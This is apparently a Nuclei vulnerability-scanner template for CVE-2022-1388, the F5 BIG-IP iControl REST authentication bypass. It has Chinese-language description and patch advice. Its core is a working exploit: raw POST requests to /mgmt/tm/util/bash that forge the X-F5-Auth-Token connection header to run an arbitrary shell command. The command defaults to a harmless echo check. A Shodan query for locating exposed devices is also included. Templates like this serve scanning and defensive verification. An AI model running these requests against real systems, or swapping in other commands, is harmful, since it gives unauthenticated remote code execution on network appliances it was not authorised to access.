id: CVE-2022-1388
info:
  name: F5 BIG-IP iControl - REST Auth Bypass RCE
  author:
  - l0ne1y
  tags:
  - f5
  - bigip
  - cve
  - cve2022
  - rce
  - mirai
  description: |-
    F5 BIG-IP iControl REST 未授权访问导致远程代码执行漏洞
    2022年05月05日，F5官方发布了CVE-2022-1388 F5 BIG-IP iControl REST 远程代码执行漏洞。CVE-2022-1388 中，攻击者可以通过未公开的请求利用该漏洞绕过BIG-IP中的iControl REST身份验证，从而可在无需身份认证的情况下调用相关Rest API，执行任意命令。
  reference:
  - https://twitter.com/gossithedog/status/1523566937414193153
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  - https://support.f5.com/csp/article/k23605346
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2022-1388
  severity: critical
  metadata:
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
    verified: "true"
  classification:
    cve-id:
    - cve-2022-1388
    cwe-id:
    - cwe-306
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://support.f5.com/csp/article/K23605346

    **临时修复方案**
    1、敏感后台禁止直接暴漏在互联网，需通过VPN等较为安全的接入方式访问内部系统。
    2、后台页面开启身份认证，根据情况选择对应方式（认证用户，用户名密码）。
    3、限制IP访问，绑定固定的IP访问后台管理系统。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - commandResult
    - 8831-2202-EVC
  matchers-condition: and
  raw:
  - |
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive, X-F5-Auth-Token
    X-F5-Auth-Token: a
    Authorization: Basic {{base64(auth)}}
    Content-Type: application/json

    {
         "command": "run",
         "utilCmdArgs": "-c '{{cmd}}'"
    }
  - |
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: localhost
    Connection: keep-alive, X-F5-Auth-Token
    X-F5-Auth-Token: a
    Authorization: Basic {{base64(auth)}}
    Content-Type: application/json

    {
         "command": "run",
         "utilCmdArgs": "-c '{{cmd}}'"
    }
  stop-at-first-match: true
variables:
  auth: 'admin:'
  cmd: echo CVE-2022-1388 | rev
